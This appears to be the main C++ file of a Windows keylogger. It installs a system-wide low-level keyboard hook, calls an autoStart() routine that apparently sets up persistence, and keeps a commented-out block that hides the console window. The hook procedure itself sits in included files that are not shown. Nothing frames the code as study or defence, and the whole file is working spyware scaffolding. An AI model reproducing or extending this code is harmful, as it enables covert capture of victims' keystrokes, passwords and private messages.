#include "define.h"
#include "keyhook.cpp"
#include "functions.cpp"

int main(int argc, const char* argv[])
{
	//begin routine

	/*
	if (IsWindowVisible(::GetConsoleWindow()) != FALSE) {
		ShowWindow(::GetConsoleWindow(), SW_HIDE);
	}
	*/

	autoStart();

	HHOOK lowlevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
	MSG msg;

	while (!GetMessage(&msg, NULL, NULL, NULL)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(lowlevelKybd);
	return 0;
}